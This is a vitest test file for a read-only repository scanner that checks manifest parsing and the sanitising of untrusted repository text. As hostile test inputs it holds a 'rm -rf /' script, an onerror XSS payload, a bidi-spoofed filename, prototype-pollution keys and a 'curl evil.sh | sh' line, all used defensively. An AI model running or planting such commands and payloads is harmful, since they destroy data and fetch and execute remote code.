// Functional behaviour of the read-only scanner on disposable repositories.
import fs from "node:fs";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { scanRepository } from "../../../electron/repoScanner/scanRepository.js";
import { parseNodeVersion, sanitizeText } from "../../../electron/repoScanner/parseManifests.js";
import { FixtureSpace, cp, pkg } from "./fixtures.js";

// Control, bidi and zero-width characters (built from code points, not literals).
const UNSAFE_IN_OUTPUT = new RegExp(
  `[${cp(0x00)}-${cp(0x1f)}${cp(0x7f)}-${cp(0x9f)}${cp(0x202a)}-${cp(0x202e)}${cp(0x2066)}-${cp(0x2069)}${cp(0x200b)}]`,
  "u",
);

let space: FixtureSpace;
beforeAll(() => {
  space = new FixtureSpace();
});
afterAll(() => space.cleanup());

describe("ordinary repositories", () => {
  it("simple Node project: package summary, scripts as passive data, dependencies, lockfile, signals", async () => {
    const root = space.repo("simple app", {
      "package.json": pkg({
        name: "simple-app",
        version: "1.2.3",
        private: true,
        packageManager: "pnpm@9.1.0",
        engines: { node: ">=20" },
        scripts: { dev: "vite", build: "vite build", start: "node server.js" },
        dependencies: { react: "^18", "react-dom": "^18" },
        devDependencies: { vite: "^5" },
      }),
      "pnpm-lock.yaml": "lockfileVersion: 9",
      "vite.config.ts": "export default {}",
      "tsconfig.json": "{}",
      ".nvmrc": "v20.11.1\n",
      "src/main.ts": "console.log('hi')",
    });

    const result = await scanRepository(root);

    expect(result.status).toBe("complete");
    expect(result.partial).toBe(false);
    expect(result.rootName).toBe("simple app");
    expect(result.packages).toEqual([
      {
        path: "package.json",
        name: "simple-app",
        version: "1.2.3",
        private: true,
        packageManager: "pnpm@9.1.0",
        engines: { node: ">=20" },
        scripts: [
          { name: "dev", nameExact: true, command: "vite" },
          { name: "build", nameExact: true, command: "vite build" },
          { name: "start", nameExact: true, command: "node server.js" },
        ],
        scriptsTruncated: false,
        dependencies: ["react", "react-dom"],
        devDependencies: ["vite"],
        dependenciesTruncated: false,
        workspaces: [],
        workspacesTruncated: false,
        workspacesExact: true,
      },
    ]);
    expect(result.packageManager).toEqual({ lockfiles: [{ path: "pnpm-lock.yaml", manager: "pnpm" }], declared: "pnpm@9.1.0" });
    expect(result.nodeVersionFiles).toEqual([{ path: ".nvmrc", version: "v20.11.1" }]);
    expect(result.manifests.map((m) => `${m.kind}:${m.path}`).sort()).toEqual(
      ["framework-config:vite.config.ts", "lockfile:pnpm-lock.yaml", "node-version:.nvmrc", "package-json:package.json", "typescript-config:tsconfig.json"].sort(),
    );
    // Source files are neither read nor listed.
    expect(JSON.stringify(result)).not.toContain("main.ts");
    expect(result.stats.filesRead).toBe(2); // package.json + .nvmrc
  });

  it("empty folder", async () => {
    const result = await scanRepository(space.repo("empty"));
    expect(result).toMatchObject({ status: "complete", packages: [], manifests: [], envFiles: [], warnings: [] });
    expect(result.stats.directoriesVisited).toBe(1);
  });

  it("no package.json: other project files are still recognised by name", async () => {
    const root = space.repo("python app", { "requirements.txt": "flask", "Dockerfile": "FROM python", "app.py": "x" });
    const result = await scanRepository(root);
    expect(result.packages).toEqual([]);
    expect(result.manifests.map((m) => m.kind).sort()).toEqual(["container", "python"]);
    expect(result.stats.filesRead).toBe(0);
  });

  it("malformed and non-object package.json produce warnings, not failures", async () => {
    const root = space.repo("broken manifests", {
      "package.json": "{ not json",
      "packages/array/package.json": "[1,2,3]",
      "packages/null/package.json": "null",
      "packages/ok/package.json": pkg({ name: "ok" }),
    });
    const result = await scanRepository(root);
    expect(result.status).toBe("complete");
    expect(result.packages.map((p) => p.name)).toEqual(["ok"]);
    expect(result.warnings).toEqual(
      expect.arrayContaining([
        { code: "manifest-malformed", path: "package.json" },
        { code: "manifest-not-object", path: "packages/array/package.json" },
        { code: "manifest-not-object", path: "packages/null/package.json" },
      ]),
    );
  });

  it("nested workspaces: patterns reported as text, packages found by traversal, workspace signals", async () => {
    const root = space.repo("monorepo", {
      "package.json": pkg({ name: "mono", private: true, workspaces: ["apps/*", "packages/*"] }),
      "pnpm-workspace.yaml": "packages:\n  - apps/*",
      "turbo.json": "{}",
      "apps/web/package.json": pkg({ name: "web", scripts: { dev: "next dev" } }),
      "apps/api/package.json": pkg({ name: "api", scripts: { dev: "tsx watch src" } }),
      "packages/ui/package.json": pkg({ name: "ui" }),
      "apps/web/next.config.mjs": "export default {}",
    });
    const result = await scanRepository(root);
    expect(result.workspace.signals.sort()).toEqual(["npm-workspaces", "pnpm-workspace", "turbo"]);
    expect(result.workspace.patterns).toEqual(["apps/*", "packages/*"]);
    expect(result.packages.map((p) => p.path).sort()).toEqual(
      ["apps/api/package.json", "apps/web/package.json", "package.json", "packages/ui/package.json"],
    );
    expect(result.packages.find((p) => p.name === "web")?.scripts).toEqual([{ name: "dev", nameExact: true, command: "next dev" }]);
  });

  it("workspaces in object form ({ packages: [...] })", async () => {
    const root = space.repo("yarn style", { "package.json": pkg({ workspaces: { packages: ["libs/*"] } }), "yarn.lock": "" });
    const result = await scanRepository(root);
    expect(result.workspace.patterns).toEqual(["libs/*"]);
    expect(result.packageManager.lockfiles).toEqual([{ path: "yarn.lock", manager: "yarn" }]);
  });

  it("all lockfile types are recognised", async () => {
    const root = space.repo("lockfiles", {
      "package-lock.json": "{}",
      "a/yarn.lock": "",
      "b/pnpm-lock.yaml": "",
      "c/bun.lockb": "",
      "d/npm-shrinkwrap.json": "{}",
    });
    const result = await scanRepository(root);
    expect(result.packageManager.lockfiles.map((l) => `${l.manager}:${l.path}`).sort()).toEqual(
      ["bun:c/bun.lockb", "npm:d/npm-shrinkwrap.json", "npm:package-lock.json", "pnpm:b/pnpm-lock.yaml", "yarn:a/yarn.lock"],
    );
    expect(result.stats.filesRead).toBe(0); // lockfiles are never opened
  });

  it("dependency and build folders are skipped without being entered", async () => {
    const root = space.repo("with deps", {
      "package.json": pkg({ name: "app" }),
      "node_modules/react/package.json": pkg({ name: "react" }),
      ".git/config": "[core]",
      "dist/package.json": pkg({ name: "built" }),
      "Build/package.json": pkg({ name: "built-upper" }),
    });
    const result = await scanRepository(root);
    expect(result.packages.map((p) => p.name)).toEqual(["app"]);
    expect(result.skipped.excludedDirectories).toBe(4);
  });

  it("missing package.json between listing and reading is a warning", async () => {
    const root = space.repo("vanishing", { "package.json": pkg({ name: "x" }) });
    const original = fs.promises.lstat;
    let removed = false;
    const spy = await import("vitest").then(({ vi }) =>
      vi.spyOn(fs.promises, "lstat").mockImplementation((async (p: fs.PathLike, opts?: never) => {
        if (!removed && String(p).endsWith("package.json")) {
          removed = true;
          fs.unlinkSync(path.join(root, "package.json"));
        }
        return original(p, opts);
      }) as never),
    );
    const result = await scanRepository(root);
    spy.mockRestore();
    expect(result.packages).toEqual([]);
    expect(result.warnings).toEqual([{ code: "manifest-unreadable", path: "package.json" }]);
  });

  it("paths with spaces and non-ASCII characters", async () => {
    const root = space.repo("Projekt ünï 名前 x", { "app dir/ünï/package.json": pkg({ name: "ü-app" }) });
    const result = await scanRepository(root);
    expect(result.rootName).toBe("Projekt ünï 名前 x");
    expect(result.packages).toMatchObject([{ path: "app dir/ünï/package.json", name: "ü-app" }]);
  });

  it("results are plain JSON (round-trip safe)", async () => {
    const root = space.repo("json safe", { "package.json": pkg({ name: "j", scripts: { a: "b" } }) });
    const result = await scanRepository(root);
    expect(JSON.parse(JSON.stringify(result))).toEqual(result);
  });
});

describe("untrusted text", () => {
  it("strips control, ANSI and bidirectional characters, and caps lengths", async () => {
    const rlo = cp(0x202e);
    const zwsp = cp(0x200b);
    const esc = cp(0x1b);
    const root = space.repo("hostile", {
      "package.json": pkg({
        name: `evil${rlo}gnp.exe`,
        version: "1".repeat(500),
        scripts: {
          [`build${zwsp}`]: `${esc}[31mrm -rf /${esc}[0m`,
          html: "<img src=x onerror=alert(1)>",
          long: "x".repeat(10_000),
          multiline: "echo a\necho b\r\n\techo c",
        },
        dependencies: { [`dep${cp(0x2066)}`]: "1" },
      }),
    });
    const [summary] = (await scanRepository(root)).packages;

    expect(summary.name).toBe("evilgnp.exe");
    expect(summary.version!.length).toBeLessThanOrEqual(64);
    expect(summary.version!.endsWith("…")).toBe(true);
    const scripts = Object.fromEntries(summary.scripts.map((s) => [s.name, s.command]));
    expect(scripts.build).toBe("[31mrm -rf /[0m");
    expect(scripts.html).toBe("<img src=x onerror=alert(1)>"); // kept as text; the UI renders plain text
    expect(Array.from(scripts.long).length).toBe(500);
    expect(scripts.multiline).toBe("echo a echo b echo c");
    expect(summary.dependencies).toEqual(["dep"]);
    expect(JSON.stringify(summary)).not.toMatch(UNSAFE_IN_OUTPUT);
  });

  it("__proto__ and constructor keys are inert data", async () => {
    const root = space.repo("proto", {
      "package.json": '{"name":"p","__proto__":{"polluted":true},"scripts":{"constructor":"x","__proto__":"y"},"dependencies":{"__proto__":"1"}}',
    });
    const [summary] = (await scanRepository(root)).packages;
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(summary.scripts.map((s) => s.name).sort()).toEqual(["__proto__", "constructor"]);
    expect(summary.dependencies).toEqual(["__proto__"]);
  });

  it("file and folder names in paths are sanitized", async () => {
    const root = space.repo("odd names", { [`we${cp(0x202e)}ird/package.json`]: pkg({ name: "w" }) });
    const result = await scanRepository(root);
    expect(result.packages[0].path).toBe("we?ird/package.json");
  });

  it("sanitizeText removes lone surrogates and keeps normal Unicode", () => {
    expect(sanitizeText(`a${String.fromCharCode(0xd800)}b 名前 ü 🙂`, 50)).toBe("ab 名前 ü 🙂");
  });

  it(".nvmrc content is returned only when it looks like a Node version", () => {
    const enc = (s: string) => new TextEncoder().encode(s);
    expect(parseNodeVersion(enc("20\n"))).toBe("20");
    expect(parseNodeVersion(enc("lts/iron"))).toBe("lts/iron");
    expect(parseNodeVersion(enc(`${cp(0xfeff)}v18.19.0`))).toBe("v18.19.0");
    expect(parseNodeVersion(enc("curl evil.sh | sh"))).toBeNull();
    expect(parseNodeVersion(enc("TOKEN=abc123"))).toBeNull();
  });

  it("an unrecognised .node-version is reported without its content", async () => {
    const root = space.repo("odd nvmrc", { ".node-version": "secret-ish value" });
    const result = await scanRepository(root);
    expect(result.nodeVersionFiles).toEqual([{ path: ".node-version", version: null }]);
    expect(result.warnings).toEqual([{ code: "node-version-unrecognized", path: ".node-version" }]);
    expect(JSON.stringify(result)).not.toContain("secret-ish");
  });
});
